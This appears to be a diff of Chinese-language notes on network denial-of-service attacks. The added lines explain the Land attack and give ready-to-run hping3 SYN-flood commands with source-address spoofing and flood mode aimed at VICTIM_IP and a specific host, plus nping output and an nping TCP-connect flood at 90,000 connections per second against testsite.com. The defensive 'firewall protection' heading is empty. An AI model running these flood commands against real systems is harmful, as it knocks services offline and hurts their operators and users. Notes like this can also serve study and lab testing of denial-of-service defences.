@@ -57,10 +57,10 @@ shell> netstat -na | grep -i SYN_RECV | more
 
 防护墙防护:
 
-3.DOS Land Attack
+3.DOS Land Attack，Land Attack是将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立连接
 http://0daysecurity.com/articles/hping3_examples.html
 
-shell> sudo hping3 -V -c 1000000 -d 120 -S -w 64 -p 445 -s 445 --flood --rand-source VICTIM_IP ip地址
+shell> sudo hping3 -V -c 1000000 -d 120 -S -w 64 -p 445 -s 445 --flood -a ip地址 --rand-source VICTIM_IP ip地址
 --flood: sent packets as fast as possible. Don't show replies.
 --rand-dest: random destionation address mode. see the man.
 -V <-- Verbose
@@ -70,4 +70,26 @@ shell> sudo hping3 -V -c 1000000 -d 120 -S -w 64 -p 445 -s 445 --flood --rand-so
 -w --win: winsize (default 64)
 -p --destport [+][+]<port> destination port(default 0) ctrl+z inc/dec
 -s --baseport: base source port (default random)
+
+使用Hping3可以很方便构建拒绝服务攻击。比如对目标机发起大量SYN连接，伪造源地址为192.168.10.99，并使用1000微秒的间隔发送各个SYN包。
+shell> sudo hping3 -I eth0 -a 192.168.10.99 -S 192.168.10.33 -p 80 -i u1000
+
+~ sudo nping -c 1 --tcp -p 80,433 192.168.242.145
+Password:
+
+4.nping - Network packet generation tool / ping utility
+
+Starting Nping 0.7.70 ( https://nmap.org/nping ) at 2018-06-07 16:58 CST
+SENT (0.0139s) TCP 192.168.242.1:64094 > 192.168.242.145:80 S ttl=64 id=823 iplen=40  seq=248962105 win=1480
+RCVD (0.0145s) TCP 192.168.242.145:80 > 192.168.242.1:64094 RA ttl=64 id=64012 iplen=40  seq=0 win=0
+SENT (1.0152s) TCP 192.168.242.1:64094 > 192.168.242.145:433 S ttl=64 id=823 iplen=40  seq=248962105 win=1480
+RCVD (1.0157s) TCP 192.168.242.145:433 > 192.168.242.1:64094 RA ttl=64 id=64065 iplen=40  seq=0 win=0
+
+Max rtt: 0.494ms | Min rtt: 0.350ms | Avg rtt: 0.422ms
+Raw packets sent: 2 (80B) | Rcvd: 2 (92B) | Lost: 0 (0.00%)
+
+TCP连接攻击：
+# nping --tcp-connect -rate=90000 -c 900000 -q testsite.com
+
+5.
 
